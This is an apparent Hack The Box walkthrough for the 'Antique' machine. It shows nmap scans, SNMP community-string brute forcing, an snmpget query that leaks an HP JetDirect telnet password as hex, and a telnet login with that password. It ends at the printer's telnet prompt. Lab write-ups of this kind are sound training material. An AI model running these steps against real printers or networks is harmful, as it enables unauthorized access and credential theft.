---
title: "HTB Walkthrough: Antique"
date: 2022-05-12T20:12:30-04:00 
categories:
  - HackTheBox
header:
  teaser: /assets/images/HTB/antique/antique.png
tags:
  - Easy
  - Linux Host
---

![Antique Logo](/assets/images/HTB/antique/antique.png)

**Welcome** to this walkthrough for the [Hack The Box](https://www.hackthebox.com/) machine Antique. This one is listed as an 'easy' box and has also been retired, so access is only provided to those that have purchased VIP access to HTB.
Because of this, you may notice that it is necessary to be connected to HTB's VIP VPN server, rather than the free server. To do this, change the dropdown selection in the top right corner where you select "Connect"
to "VIP" and download the .ovpn package (yes, even as a paid user, you must toggle between free and paid VPN packages depending on the machine).

---

## Scanning

Go ahead and run your favorite port scan. I will use NMap :  

### NMap Results  

```bash
TCP PORT SCAN:
sudo nmap -sS -A -sV -T5 -p- 10.10.11.107 | tee nmap.log

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
```  

```bash
UDP PORT SCAN:
sudo nmap -sU 10.10.11.107 --open --top-ports=1000 | tee nmap-udp.log

PORT      STATE         SERVICE
137/udp   open|filtered netbios-ns
161/udp   open          snmp
1037/udp  open|filtered ams
1080/udp  open|filtered socks
5353/udp  open|filtered zeroconf
9001/udp  open|filtered etlservicemgr
16545/udp open|filtered unknown
18081/udp open|filtered unknown
18980/udp open|filtered unknown
20249/udp open|filtered unknown
21524/udp open|filtered unknown
23980/udp open|filtered unknown
30263/udp open|filtered unknown
33030/udp open|filtered unknown
34579/udp open|filtered unknown
35777/udp open|filtered unknown
44185/udp open|filtered unknown
45818/udp open|filtered unknown
47772/udp open|filtered unknown
49166/udp open|filtered unknown
49176/udp open|filtered unknown
49197/udp open|filtered unknown
51586/udp open|filtered unknown
```  

## Enumeration  

It looks like we have a printer JetDirect running on port 23 - Telnet && snmp is also open on UDP 161.  
Let's try to get some more information on these services.  

### SNMP - UDP 161  

NMap has many useful scripts for enumeration located in /usr/share/nmap/scripts. Normally if I am trying to run an NMap script on a target, I print all the relevant ones likeso :  

>ls -la /usr/share/nmap/scripts | grep [SERVICE]

```bash
┌──(kali㉿kali)-[~]
└─$ ls -la /usr/share/nmap/scripts/ | grep snmp      
-rw-r--r-- 1 root root  7816 Jan 18 09:54 snmp-brute.nse
-rw-r--r-- 1 root root  4388 Jan 18 09:54 snmp-hh3c-logins.nse
-rw-r--r-- 1 root root  5216 Jan 18 09:54 snmp-info.nse
-rw-r--r-- 1 root root 28644 Jan 18 09:54 snmp-interfaces.nse
-rw-r--r-- 1 root root  5978 Jan 18 09:54 snmp-ios-config.nse
-rw-r--r-- 1 root root  4156 Jan 18 09:54 snmp-netstat.nse
-rw-r--r-- 1 root root  4431 Jan 18 09:54 snmp-processes.nse
-rw-r--r-- 1 root root  1857 Jan 18 09:54 snmp-sysdescr.nse
-rw-r--r-- 1 root root  2570 Jan 18 09:54 snmp-win32-services.nse
-rw-r--r-- 1 root root  2739 Jan 18 09:54 snmp-win32-shares.nse
-rw-r--r-- 1 root root  4713 Jan 18 09:54 snmp-win32-software.nse
-rw-r--r-- 1 root root  2016 Jan 18 09:54 snmp-win32-users.nse
```  

Let's try using snmp-brute.nse script. According to [NMAP.ORG](https://nmap.org/nsedoc/scripts/snmp-brute.html), this script attempts to find SNMP community strings via brute-force guessing.  

SNMP community strings are unencrypted and only used in SNMPv1 & SNMPv2, prior to SSL/TLS. They act as a username or password that is shared to authenticate SNMP management stations to a device.  
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU --script=snmp-brute.nse 10.10.11.107 -p 161
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-13 01:06 EDT
Nmap scan report for 10.10.11.107
Host is up (0.075s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute: 
|   <empty> - Valid credentials
|   cascade - Valid credentials
|   secret - Valid credentials
|   rmonmgmtuicommunity - Valid credentials
|   ANYCOM - Valid credentials
|   volition - Valid credentials
|   ILMI - Valid credentials
|   TENmanUFactOryPOWER - Valid credentials
|   MiniAP - Valid credentials
|   PRIVATE - Valid credentials
|   admin - Valid credentials
|   private - Valid credentials
|   public - Valid credentials
|   PUBLIC - Valid credentials
|   snmpd - Valid credentials
|   cisco - Valid credentials
|   mngt - Valid credentials
|_  snmp-Trap - Valid credentials
```  

#Insert about exploits & snmpget description

```bash
──(kali㉿kali)-[~/Documents/HTB/Antique]
└─$ snmpget -v 1 -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
```  

This is a hex dump of the Telnet password, let's decipher it really quick. I used CyberChef to convert it to plain text :  

![Hex Deciphered in CyberChef](/assets/images/HTB/antique/pass-hex.png)  

### Telnet - TCP 23  
 Let's first try to connect to this JetDirect printer via telnet :  

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Antique]
└─$ telnet 10.10.11.107 
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: password
Invalid password
Connection closed by foreign host.
```  

We can use the password we grabbed from SNMP to login here :  

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Antique]
└─$ telnet 10.10.11.107 
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
```  

